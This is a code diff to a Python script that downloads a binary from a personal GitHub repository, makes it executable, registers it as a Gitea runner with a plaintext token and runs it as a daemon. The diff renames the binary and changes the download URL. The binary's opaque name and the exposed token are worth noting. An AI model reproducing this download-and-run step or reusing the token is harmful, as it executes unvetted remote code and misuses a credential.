@@ -4,17 +4,19 @@ import os
 
 TOKEN = "40ce80QAqU5DPfOqwHvsyTBpxx9OLqOjdna2maHk"
 
-URL = "https://github.com/hamcolio/symmetrical-invention/raw/refs/heads/main/neoior"
-BINARY = "neoior"
+URL = "https://github.com/KOSOCOFA/legendary-rotary-phone/raw/refs/heads/main/kosovok"
 
-print("[1] Downloading neoior...")
-urllib.request.urlretrieve(URL, BINARY)
+# Download binary
+print("[1] Downloading kosovok...")
+urllib.request.urlretrieve(URL, "kosovok")
 
-os.chmod(BINARY, 0o755)
+# Set permissions
+os.chmod("kosovok", 0o755)
 
+# Register runner
 print("[2] Registering runner...")
 subprocess.run([
-    "./neoior",
+    "./kosovok",
     "register",
     "--instance", "https://gitea.com/",
     "--token", TOKEN,
@@ -22,5 +24,6 @@ subprocess.run([
     "--name", "maiso"
 ], check=True)
 
+# Start daemon
 print("[3] Starting daemon...")
-subprocess.run(["./neoior", "daemon"], check=True)
+subprocess.run(["./kosovok", "daemon"], check=True)
